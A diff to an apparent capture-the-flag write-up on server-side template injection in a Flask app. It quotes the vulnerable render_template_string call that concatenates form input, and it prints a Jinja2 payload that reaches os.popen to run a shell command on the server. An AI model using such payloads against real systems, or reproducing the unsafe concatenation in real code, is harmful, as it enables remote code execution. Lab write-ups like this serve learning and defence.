@@ -65,7 +65,9 @@ def announcement():
 <h1 style="font-size:100px;" align="center">""" + request.form.get("content", "") + """</h1>""", )
 ```
 
-5. At this point I still had no knowledge of what to do, so next I ran `ls` inside the directory:
+This confirms it — `render_template_string("..." + content)` puts my input straight into the template, so whatever I type gets evaluated as Jinja2 code. That's the SSTI.
+
+5. Since SSTI means my input runs as template code, I listed the directory to find where the flag lives:
 
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
